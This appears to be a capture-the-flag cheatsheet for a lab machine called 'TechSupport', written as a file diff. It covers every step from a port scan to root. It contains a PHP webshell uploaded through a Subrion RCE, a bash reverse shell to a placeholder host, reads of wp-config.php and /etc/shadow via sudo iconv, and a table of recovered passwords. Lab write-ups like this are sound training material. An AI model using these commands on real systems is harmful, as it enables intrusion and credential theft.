@@ -1,0 +1,110 @@
+# TechSupport — Commands Cheatsheet
+
+## Phase 1: Reconnaissance
+```bash
+# Full port scan with service detection
+nmap -sC -sV 10.64.155.75
+
+# Web directory brute force
+gobuster dir -u http://10.64.155.75 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,html,txt
+```
+
+## Phase 2: SMB Enumeration
+```bash
+# List all shares (no auth)
+smbclient -L //10.64.155.75 -N
+
+# Connect to websvr share
+smbclient //10.64.155.75/websvr -N
+
+# Inside smbclient - download all files
+smb: \> ls
+smb: \> get enter.txt
+
+# Full SMB enumeration
+enum4linux -a 10.64.155.75
+```
+
+## Phase 3: Decode Password
+```bash
+# Try ROT47 in CyberChef (Magic wand)
+# Input:  7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
+# Output: Scam2021
+
+# Manual ROT47
+echo "7sKvntXdPEJaxazce9PXi24zaFrLiKWCk" | tr '!-~' 'P-~!-O'
+```
+
+## Phase 4: Subrion RCE (CVE-2018-19422)
+```bash
+# Create webshell
+echo '<?php system($_GET["cmd"]); ?>' > shell.phar
+
+# Upload via: http://10.64.155.75/subrion/panel/
+# Go to: Content → Uploads → Upload shell.phar
+
+# Test RCE
+curl "http://10.64.155.75/subrion/uploads/shell.phar?cmd=id"
+
+# Start listener
+nc -lvnp 4444
+
+# Trigger reverse shell (replace YOUR_IP)
+curl "http://10.64.155.75/subrion/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
+```
+
+## Phase 5: Shell Stabilization
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo; fg
+```
+
+## Phase 6: Post-Exploitation (www-data)
+```bash
+# Find WordPress creds
+cat /var/www/html/wordpress/wp-config.php
+
+# Check SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# List home directories
+ls /home/
+```
+
+## Phase 7: Lateral Movement
+```bash
+# SSH as scamsite
+ssh scamsite@10.64.155.75
+# Password: Scam2021
+```
+
+## Phase 8: Privilege Escalation
+```bash
+# Check sudo rights
+sudo -l
+# Result: (ALL) NOPASSWD: /usr/bin/iconv
+
+# Read root flag (GTFOBins iconv)
+sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
+
+# Bonus: Read shadow file
+sudo iconv -f 8859_1 -t 8859_1 /etc/shadow
+```
+
+## Credentials Found
+| Service   | Username | Password                |
+|-----------|----------|-------------------------|
+| Subrion   | admin    | Scam2021                |
+| WordPress | support  | ImAScammerLOL!123!      |
+| SSH       | scamsite | Scam2021                |
+
+## Users Discovered
+| Username  | Method        |
+|-----------|---------------|
+| scamsite  | enum4linux RID cycling |
+| www-data  | Subrion RCE   |
+| root      | iconv privesc |
